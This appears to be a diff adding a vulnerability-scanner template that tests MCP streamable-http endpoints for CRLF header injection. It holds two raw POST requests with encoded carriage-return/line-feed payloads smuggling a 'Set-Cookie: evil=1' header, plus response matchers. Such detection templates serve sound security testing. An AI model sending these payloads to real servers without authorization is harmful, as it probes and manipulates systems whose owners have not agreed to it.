@@ -1,0 +1,40 @@
+id: mcp-sse-header-injection
+
+info:
+  name: MCP SSE Header Injection (CRLF)
+  author: crowdsentinel
+  severity: high
+  description: |
+    Tests for CRLF injection in HTTP headers on the MCP streamable-http
+    transport. Sends crafted headers containing carriage return and line
+    feed characters to inject arbitrary response headers.
+  tags: mcp,crlf,header-injection,sse
+
+http:
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+        X-Injected: true%0d%0aSet-Cookie: evil=1
+
+        {"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"crlf-test","version":"1.0"}},"id":1}
+
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+        X-Custom: value%0d%0aX-Injected: true%0d%0aSet-Cookie: evil=1
+
+        {"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"crlf-test2","version":"1.0"}},"id":2}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: evil"
+          - "X-Injected: true"
+        condition: or
